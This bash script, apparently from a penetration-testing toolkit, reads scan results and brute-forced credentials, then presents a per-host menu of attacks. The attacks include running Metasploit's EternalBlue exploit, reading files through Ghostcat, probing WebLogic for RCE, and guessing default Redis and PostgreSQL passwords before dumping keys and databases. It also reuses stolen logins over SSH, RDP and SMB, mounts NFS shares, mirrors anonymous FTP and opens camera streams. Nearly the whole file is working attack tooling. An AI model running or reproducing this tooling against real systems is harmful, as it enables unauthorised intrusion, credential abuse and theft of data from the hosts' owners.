#!/usr/bin/env bash
source "$(dirname "$0")/lib.sh"

set -uo pipefail

banner "POST-DISCOVERY" "action hub — turn scan findings into access"

# ── Session selection ─────────────────────────────────────────────────────────
mapfile -t SESSIONS < <(ls -1dt results/*/ 2>/dev/null || true)

if [[ ${#SESSIONS[@]} -eq 0 ]]; then
  printf '  %s[!] No scan sessions in results/. Run a scan first.%s\n\n' "${RED}" "${RESET}"
  exit 0
fi

printf '  %s[+]%s Available sessions:\n\n' "${GREEN}" "${RESET}"
printf '  %s  %-4s  %-26s  %s%s\n' "${DIM}" "ID" "SESSION" "FILES" "${RESET}"
printf '  %s  ──── ────────────────────────── ─────%s\n' "${DIM}" "${RESET}"
for i in "${!SESSIONS[@]}"; do
  _d="${SESSIONS[$i]}"; _ts="${_d%/}"; _ts="${_ts##*/}"
  _fc=$(find "$_d" -maxdepth 1 -name "*.txt" -not -name ".*.txt" 2>/dev/null | wc -l)
  printf '  %s[%02d]%s  %-26s  %d file(s)\n' "${CYAN}" "$(( i + 1 ))" "${RESET}" "$_ts" "$_fc"
done

printf '\n  %s>>%s Select session [1]: ' "${CYAN}" "${RESET}"
read -r _pick </dev/tty || _pick="1"
_pick="${_pick:-1}"
[[ "$_pick" =~ ^[0-9]+$ ]] && (( _pick >= 1 && _pick <= ${#SESSIONS[@]} )) || _pick=1

SESSION_DIR="${SESSIONS[$(( _pick - 1 ))]}"
SESSION_NAME="${SESSION_DIR%/}"; SESSION_NAME="${SESSION_NAME##*/}"
printf '\n  %s[SYS]%s Session : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$SESSION_NAME" "${RESET}"

# ── Load host + port data from all scan result files ──────────────────────────
section "LOADING DATA"

declare -A HOSTS=()

for _f in "${SESSION_DIR}"/*.txt; do
  [[ -f "$_f" ]] || continue
  _cur=""
  while IFS= read -r _line; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      _cur="${BASH_REMATCH[1]}"
    elif [[ -n "${_cur}" && "$_line" =~ ^([0-9]+)/(tcp|udp).*open ]]; then
      HOSTS["$_cur"]+="${BASH_REMATCH[1]}/${BASH_REMATCH[2]} "
    elif [[ "$_line" =~ \[\*\]\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):([0-9]+) ]]; then
      HOSTS["${BASH_REMATCH[1]}"]+="${BASH_REMATCH[2]}/tcp "
    fi
  done < "$_f"
done

if [[ ${#HOSTS[@]} -eq 0 ]]; then
  printf '  %s[!] No host data found. Run nmap or fscan first.%s\n\n' "${YELLOW}" "${RESET}"
  exit 0
fi

declare -a HOST_LIST=()
for _ip in "${!HOSTS[@]}"; do HOST_LIST+=("$_ip"); done

printf '  %s[+]%s %d host(s) loaded%s\n' "${GREEN}" "${RESET}" "${#HOST_LIST[@]}" "${RESET}"

# ── Helpers ───────────────────────────────────────────────────────────────────
_has_port() { [[ " $1 " == *" $2/tcp "* || " $1 " == *" $2/udp "* ]]; }

_get_creds() {
  (grep -F "$1" "${SESSION_DIR}/brute.txt" 2>/dev/null || true) | grep "login:"
}

_cred_user() { printf '%s' "$1" | grep -o 'login: [^ ]*' | awk '{print $2}'; }
_cred_pass() { printf '%s' "$1" | sed 's/.*password: //'; }

# ── Action implementations ────────────────────────────────────────────────────
_act_ftp() {
  local host="$1"
  printf '  %s[*]%s Anonymous FTP on %s\n' "${CYAN}" "${RESET}" "$host"
  curl -s --connect-timeout 5 "ftp://${host}/" --user "anonymous:anonymous" 2>/dev/null \
    | head -40 || printf '  %s[~]%s Anonymous FTP rejected%s\n' "${DIM}" "${RESET}" "${RESET}"
  printf '\n  %s>>%s Mirror all files with wget? [y/N]: ' "${CYAN}" "${RESET}"
  read -r _dl </dev/tty || _dl="n"
  if [[ "${_dl,,}" == "y" ]]; then
    local _out="results/.ftp_${host}_$(date +%H%M%S)"
    mkdir -p "$_out"
    wget -q -r --no-passive-ftp --user=anonymous --password=anonymous \
      "ftp://${host}/" -P "$_out" 2>/dev/null || true
    printf '  %s[+]%s Saved to %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$_out" "${RESET}"
  fi
}

_act_ssh() {
  local host="$1"
  local _creds _user _pass
  _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '  %s[*]%s Connecting as %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_user" "${RESET}"
    if check_tool sshpass; then
      sshpass -p "$_pass" ssh -o StrictHostKeyChecking=no "${_user}@${host}" || true
    else
      ssh -o StrictHostKeyChecking=no "${_user}@${host}" || true
    fi
  else
    printf '  %s>>%s Username: ' "${CYAN}" "${RESET}"
    read -r _user </dev/tty || _user="root"
    _user="${_user:-root}"
    ssh -o StrictHostKeyChecking=no "${_user}@${host}" || true
  fi
}

_act_http() {
  local host="$1" port="$2" scheme="$3"
  local url="${scheme}://${host}:${port}/"
  printf '  %s[*]%s %s\n' "${CYAN}" "${RESET}" "$url"
  curl -skL --connect-timeout 5 -I "$url" 2>/dev/null | head -8 || true
  printf '\n  %s[*]%s Page title:\n' "${CYAN}" "${RESET}"
  curl -skL --connect-timeout 5 "$url" 2>/dev/null \
    | grep -io '<title>[^<]*' | sed 's/<title>/  Title: /' || true
  local _creds; _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '\n  %s[*]%s Testing found creds %s%s:%s%s\n' \
      "${CYAN}" "${RESET}" "${DIM}" "$_user" "$_pass" "${RESET}"
    curl -skL --connect-timeout 5 -u "${_user}:${_pass}" "$url" \
      -o /dev/null -w "  HTTP status: %{http_code}\n" || true
  fi
}

_act_smb_shares() {
  local host="$1"
  printf '  %s[*]%s SMB null session — listing shares on %s\n' "${CYAN}" "${RESET}" "$host"
  smbclient -L "//${host}" -N 2>/dev/null \
    || printf '  %s[~]%s Null session rejected%s\n' "${DIM}" "${RESET}" "${RESET}"
  local _creds; _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '\n  %s[*]%s Retrying with found creds %s%s%s\n' \
      "${CYAN}" "${RESET}" "${DIM}" "$_user" "${RESET}"
    smbclient -L "//${host}" -U "${_user}%${_pass}" 2>/dev/null || true
  fi
}

_act_ms17010() {
  local host="$1"
  if ! check_tool msfconsole; then
    printf '  %s[!]%s msfconsole not found: apt install metasploit-framework%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
    return
  fi
  local _lhost; _lhost=$(get_ip)
  printf '  %s[!]%s MS17-010 EternalBlue against %s%s%s — LHOST: %s\n\n' \
    "${RED}" "${RESET}" "${RED}" "$host" "${RESET}" "$_lhost"
  msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS ${host}
set LHOST ${_lhost}
check
run
" || true
}

_act_rtsp() {
  local host="$1" port="$2"
  if ! check_tool mpv; then
    printf '  %s[!]%s mpv not installed: apt install mpv%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    printf '  Stream URL: %srtsp://%s:%s/%s\n' "${CYAN}" "$host" "$port" "${RESET}"
    return
  fi
  printf '  %s[*]%s Probing RTSP paths on %s:%s...%s\n' "${CYAN}" "${RESET}" "$host" "$port" "${RESET}"
  for _path in "" "live" "stream" "cam" "h264" "1/1" "channel1" "video1"; do
    local _url="rtsp://${host}:${port}/${_path}"
    printf '  %s>>%s %-44s' "${DIM}" "${RESET}" "$_url"
    if mpv --no-audio --frames=1 --really-quiet "$_url" &>/dev/null; then
      printf '%s[✔]%s\n' "${GREEN}" "${RESET}"
      mpv "$_url" &
      return
    fi
    printf '%s[✘]%s\n' "${DIM}" "${RESET}"
  done
  printf '  %s[~]%s No RTSP stream answered%s\n' "${DIM}" "${RESET}" "${RESET}"
}

_act_mqtt() {
  local host="$1"
  printf '  %s[*]%s MQTT broker %s — subscribing 15 s...%s\n' \
    "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool mosquitto_sub; then
    timeout 15 mosquitto_sub -h "$host" -t "#" -v 2>/dev/null || true
  else
    python3 - <<PYEOF
import socket, time
host = "${host}"
payload = b'\x10\x14\x00\x04MQTT\x04\x02\x00\x3c\x00\x08fsec-hub'
s = socket.socket()
s.settimeout(5)
try:
    s.connect((host, 1883))
    s.send(payload)
    r = s.recv(256)
    print("  [+] MQTT CONNACK received" if r else "  [~] No CONNACK")
    if r and r[0] == 0x20 and r[3] == 0:
        print("  [+] Broker accepts unauthenticated connections!")
    s.close()
except Exception as e:
    print(f"  [~] Connect failed: {e}")
PYEOF
  fi
}

_act_telnet() {
  local host="$1"
  local _creds; _creds=$(_get_creds "$host" | head -1)
  printf '  %s[*]%s Connecting to Telnet on %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  [[ -n "$_creds" ]] && printf '  %s[+]%s Try: %s%s%s\n' \
    "${GREEN}" "${RESET}" "${DIM}" "$_creds" "${RESET}"
  if check_tool telnet; then
    telnet "$host" || true
  else
    printf '  %s[!]%s telnet not found: apt install telnet%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_rdp() {
  local host="$1" _user="administrator" _pass=""
  local _creds; _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '  %s[*]%s RDP with found creds %s%s%s\n' \
      "${CYAN}" "${RESET}" "${DIM}" "${_user}:${_pass}" "${RESET}"
  else
    printf '  %s>>%s Username [administrator]: ' "${CYAN}" "${RESET}"
    read -r _user </dev/tty || _user="administrator"; _user="${_user:-administrator}"
    printf '  %s>>%s Password: ' "${CYAN}" "${RESET}"
    read -rs _pass </dev/tty || _pass=""; printf '\n'
  fi
  if check_tool xfreerdp; then
    xfreerdp /v:"$host" /u:"$_user" /p:"$_pass" /cert:ignore 2>/dev/null || true
  elif check_tool rdesktop; then
    rdesktop -u "$_user" -p "$_pass" "$host" 2>/dev/null || true
  else
    printf '  %s[!]%s No RDP client: apt install freerdp2-x11%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_snmp() {
  local host="$1"
  printf '  %s[*]%s SNMP walk on %s (community: public)%s\n' \
    "${CYAN}" "${RESET}" "$host" "${RESET}"
  snmpwalk -v2c -c public -t 3 "$host" 2>/dev/null | head -50 || true
}

_act_nfs() {
  local host="$1"
  printf '  %s[*]%s NFS shares on %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"

  # Show exports
  if check_tool showmount; then
    printf '  %s[*]%s Running showmount -e %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
    local exports; exports=$(showmount -e --no-headers "$host" 2>/dev/null) || true
    if [[ -z "$exports" ]]; then
      printf '  %s[~]%s No exports returned (may be filtered)%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    else
      printf '%s\n' "$exports"
      # Offer to mount each share
      while IFS= read -r line; do
        local path access
        path=$(printf '%s' "$line" | awk '{print $1}')
        access=$(printf '%s' "$line" | awk '{print $2}')
        printf '\n  %s>>%s Mount %s:%s [access: %s] ? (y/N): ' \
          "${CYAN}" "${RESET}" "$host" "$path" "$access"
        local ans; read -r ans </dev/tty || ans="n"
        if [[ "${ans,,}" == "y" ]]; then
          local mnt="/mnt/nfs_${host//./_}$(printf '%s' "$path" | tr '/' '_')"
          mkdir -p "$mnt"
          if mount -t nfs "$host:$path" "$mnt" 2>/dev/null; then
            printf '  %s[+]%s Mounted at %s%s\n' "${GREEN}" "${RESET}" "$mnt" "${RESET}"
            ls -la "$mnt" 2>/dev/null | head -20 || true
          else
            printf '  %s[!]%s Mount failed — may need root or NFS client tools%s\n' \
              "${RED}" "${RESET}" "${RESET}"
          fi
        fi
      done <<< "$exports"
    fi
  else
    printf '  %s[~]%s showmount not found — apt install nfs-common%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
    printf '  %s[*]%s Trying nmap NFS scripts...%s\n' "${CYAN}" "${RESET}" "${RESET}"
    nmap -sT --unprivileged -p 2049,111 \
      --script nfs-showmount,nfs-ls,nfs-statfs \
      "$host" 2>/dev/null || true
  fi
}

_act_ghostcat() {
  local host="$1"
  printf '  %s[*]%s Ghostcat AJP on %s:8009 — CVE-2020-1938%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  printf '  %s>>%s File to read [/WEB-INF/web.xml]: ' "${CYAN}" "${RESET}"
  local filepath; read -r filepath </dev/tty || filepath=""
  filepath="${filepath:-/WEB-INF/web.xml}"
  if check_tool nmap; then
    nmap -sT --unprivileged -p 8009 \
      --script ajp-request \
      --script-args "ajp-request.path=${filepath}" \
      "$host" 2>/dev/null || true
  else
    printf '  %s[~]%s nmap not found%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_weblogic() {
  local host="$1"
  printf '  %s[*]%s WebLogic T3 probe on %s:7001%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  # T3 handshake
  local resp; resp=$(printf 't3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n' \
    | nc -w 4 "$host" 7001 2>/dev/null | strings | head -3) || true
  if printf '%s' "$resp" | grep -qi 'HELO\|weblogic\|t3'; then
    printf '  %s[!] WebLogic T3 confirmed — CVE-2019-2725 / CVE-2015-4852 apply%s\n' "${RED}" "${RESET}"
    printf '%s\n' "$resp"
  else
    printf '  %s[~]%s No T3 response — may need HTTP console check%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    curl -sk --max-time 5 "http://$host:7001/console" 2>/dev/null | grep -i 'weblogic\|title' | head -3 || true
  fi
  printf '  %s[*]%s MSF: use exploit/multi/misc/weblogic_deserialize_asyncresponseservice%s\n' \
    "${DIM}" "${RESET}" "${RESET}"
}

_act_redis() {
  local host="$1"
  printf '  %s[*]%s Redis on %s:6379%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  # Try unauthenticated PING
  local pong; pong=$(printf '*1\r\n$4\r\nPING\r\n' | nc -w 3 "$host" 6379 2>/dev/null | head -1) || true
  if printf '%s' "$pong" | grep -q '+PONG'; then
    printf '  %s[!] UNAUTHENTICATED — no password required%s\n' "${RED}" "${RESET}"
    printf '  %s[*]%s Listing keys (KEYS *):%s\n' "${CYAN}" "${RESET}" "${RESET}"
    printf '*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n' | nc -w 3 "$host" 6379 2>/dev/null | grep -v '^\*\|^\$\|^:' | head -30 || true
  elif printf '%s' "$pong" | grep -qi 'noauth\|NOAUTH'; then
    printf '  %s[~]%s Auth required — trying defaults%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    for pw in redis password admin 123456 root default; do
      local auth_resp; auth_resp=$(printf '*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n' "${#pw}" "$pw" \
        | nc -w 3 "$host" 6379 2>/dev/null | head -1) || true
      if printf '%s' "$auth_resp" | grep -q '+OK'; then
        printf '  %s[+] Password found: %s%s%s\n' "${GREEN}" "${BOLD}" "$pw" "${RESET}"
        break
      fi
    done
  else
    printf '  %s[~]%s No response on 6379%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_postgres() {
  local host="$1"
  printf '  %s[*]%s PostgreSQL on %s:5432%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool psql; then
    local connected=false
    for creds in 'postgres:' 'postgres:postgres' 'postgres:password' 'postgres:admin' 'admin:admin'; do
      local u="${creds%%:*}" p="${creds##*:}"
      local out; out=$(PGPASSWORD="$p" PGCONNECT_TIMEOUT=4 \
        psql -h "$host" -U "$u" -d postgres -c 'SELECT version();' -t -A 2>/dev/null) || true
      if [[ -n "$out" ]]; then
        printf '  %s[+] Connected — user: %s  pass: %s%s\n' "${GREEN}" "$u" "${p:-<blank>}" "${RESET}"
        printf '%s\n' "$out" | head -5
        printf '  %s[*]%s Listing databases:%s\n' "${CYAN}" "${RESET}" "${RESET}"
        PGPASSWORD="$p" psql -h "$host" -U "$u" -d postgres -c '\l' -t -A 2>/dev/null | head -20 || true
        connected=true
        break
      fi
    done
    $connected || printf '  %s[~]%s No default credentials worked%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  else
    printf '  %s[~]%s psql not found — apt install postgresql-client%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    # Fallback: raw TCP banner grab
    nc -w 4 "$host" 5432 2>/dev/null | strings | head -5 || true
  fi
}

# ── Host table display ────────────────────────────────────────────────────────
_show_hosts() {
  printf '\n'
  printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
  printf '  %s│  DISCOVERED HOSTS                                │%s\n' "${CYAN}${BOLD}" "${RESET}"
  printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
  printf '\n'
  printf '  %s  %-4s  %-16s  %s%s\n' "${DIM}" "ID" "HOST" "OPEN PORTS" "${RESET}"
  printf '  %s  ──── ──────────────── ──────────────────────────%s\n' "${DIM}" "${RESET}"
  for i in "${!HOST_LIST[@]}"; do
    local _ip="${HOST_LIST[$i]}"
    local _ports="${HOSTS[$_ip]}"
    local _disp; _disp=$(printf '%s' "$_ports" | tr ' ' '\n' | grep -v '^$' | head -6 | tr '\n' ' ')
    local _has_creds=""; _get_creds "$_ip" | grep -q "login:" 2>/dev/null && _has_creds=" ${GREEN}[✔ creds]${RESET}"
    printf "  %s[%02d]%s  %-16s  %s%s%s%s\n" \
      "${CYAN}" "$(( i + 1 ))" "${RESET}" "$_ip" "${DIM}" "$_disp" "${RESET}" "$_has_creds"
  done
  printf '\n'
}

# ── Action menu per host ──────────────────────────────────────────────────────
_host_menu() {
  local host="$1"
  local ports="${HOSTS[$host]:-}"
  declare -a LABELS=() FUNCS=()

  _has_port "$ports" "21"   && { LABELS+=("FTP — anonymous list + download");         FUNCS+=("_act_ftp $host"); }
  _has_port "$ports" "22"   && { LABELS+=("SSH — connect (uses found creds if any)"); FUNCS+=("_act_ssh $host"); }
  _has_port "$ports" "23"   && { LABELS+=("Telnet — connect");                         FUNCS+=("_act_telnet $host"); }
  _has_port "$ports" "80"   && { LABELS+=("HTTP — fingerprint + credential check");   FUNCS+=("_act_http $host 80 http"); }
  _has_port "$ports" "443"  && { LABELS+=("HTTPS — fingerprint + credential check");  FUNCS+=("_act_http $host 443 https"); }
  _has_port "$ports" "8080" && { LABELS+=("HTTP :8080 — fingerprint + creds");        FUNCS+=("_act_http $host 8080 http"); }
  _has_port "$ports" "8443" && { LABELS+=("HTTPS :8443 — fingerprint + creds");       FUNCS+=("_act_http $host 8443 https"); }
  _has_port "$ports" "445"  && { LABELS+=("SMB — list shares (null session + creds)"); FUNCS+=("_act_smb_shares $host"); }
  _has_port "$ports" "445"  && { LABELS+=("SMB — MS17-010 EternalBlue check + run");  FUNCS+=("_act_ms17010 $host"); }
  _has_port "$ports" "554"  && { LABELS+=("RTSP — probe streams (port 554)");         FUNCS+=("_act_rtsp $host 554"); }
  _has_port "$ports" "8554" && { LABELS+=("RTSP — probe streams (port 8554)");        FUNCS+=("_act_rtsp $host 8554"); }
  _has_port "$ports" "1883" && { LABELS+=("MQTT — subscribe to # (15 s capture)");    FUNCS+=("_act_mqtt $host"); }
  _has_port "$ports" "3389" && { LABELS+=("RDP — connect with credentials");          FUNCS+=("_act_rdp $host"); }
  _has_port "$ports" "161"  && { LABELS+=("SNMP — walk (public community)");          FUNCS+=("_act_snmp $host"); }
  _has_port "$ports" "2049" && { LABELS+=("NFS — showmount exports + mount share");   FUNCS+=("_act_nfs $host"); }
  _has_port "$ports" "6379" && { LABELS+=("Redis — auth check + key dump");           FUNCS+=("_act_redis $host"); }
  _has_port "$ports" "5432" && { LABELS+=("PostgreSQL — default creds + DB list");    FUNCS+=("_act_postgres $host"); }
  _has_port "$ports" "8009" && { LABELS+=("Ghostcat AJP — CVE-2020-1938 file read"); FUNCS+=("_act_ghostcat $host"); }
  _has_port "$ports" "7001" && { LABELS+=("WebLogic — CVE-2019-2725 T3 RCE check");  FUNCS+=("_act_weblogic $host"); }

  if [[ ${#LABELS[@]} -eq 0 ]]; then
    printf '\n  %s[~]%s No actionable services found for %s.%s\n' \
      "${DIM}" "${RESET}" "$host" "${RESET}"
    return
  fi

  _creds_all=$(_get_creds "$host")

  _draw_menu() {
    printf '\n  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
    printf '  %s│  ACTIONS — %-39s│%s\n' "${CYAN}${BOLD}" "$host " "${RESET}"
    printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
    printf '\n'
    if [[ -n "${_creds_all}" ]]; then
      printf '  %s[✔] Found credentials:%s\n' "${GREEN}" "${RESET}"
      while IFS= read -r _cl; do
        printf '      %s%s%s\n' "${GREEN}" "$_cl" "${RESET}"
      done <<< "${_creds_all}"
      printf '\n'
    fi
    for i in "${!LABELS[@]}"; do
      printf '  %s[%02d]%s ▶  %s\n' "${CYAN}" "$(( i + 1 ))" "${RESET}" "${LABELS[$i]}"
    done
    printf '  %s[00]%s ▶  Back to host list\n\n' "${RED}" "${RESET}"
  }

  _draw_menu

  while true; do
    printf '  %s>>%s ' "${CYAN}" "${RESET}"
    read -r _choice </dev/tty || return
    case "${_choice:-}" in
      0|00) return ;;
      '')   _draw_menu ;;
      *)
        if [[ "$_choice" =~ ^[0-9]+$ ]] && \
           (( _choice >= 1 && _choice <= ${#LABELS[@]} )); then
          printf '\n'
          eval "${FUNCS[$(( _choice - 1 ))]}" || true
          printf '\n  %s▶%s Press Enter to continue...' "${DIM}" "${RESET}"
          read -r _ </dev/tty || true
          _draw_menu
        else
          printf '  %s[!] Enter 01-%02d or 00%s\n' "${YELLOW}" "${#LABELS[@]}" "${RESET}"
        fi
        ;;
    esac
  done
}

# ── Main loop ─────────────────────────────────────────────────────────────────
trap 'printf "\n  %s[!] Disconnecting.%s\n\n" "${RED}" "${RESET}"; exit 0' INT

while true; do
  _show_hosts
  printf '  %s>>%s Select host (0 to exit): ' "${CYAN}" "${RESET}"
  read -r _hpick </dev/tty || break

  case "${_hpick:-}" in
    0|00|q) printf '  %s[!] Disconnecting.%s\n\n' "${RED}" "${RESET}"; exit 0 ;;
    '')     continue ;;
    *)
      if [[ "$_hpick" =~ ^[0-9]+$ ]] && \
         (( _hpick >= 1 && _hpick <= ${#HOST_LIST[@]} )); then
        _host_menu "${HOST_LIST[$(( _hpick - 1 ))]}"
      else
        printf '  %s[!] Enter 01-%02d or 00%s\n\n' \
          "${YELLOW}" "${#HOST_LIST[@]}" "${RESET}"
      fi
      ;;
  esac
done
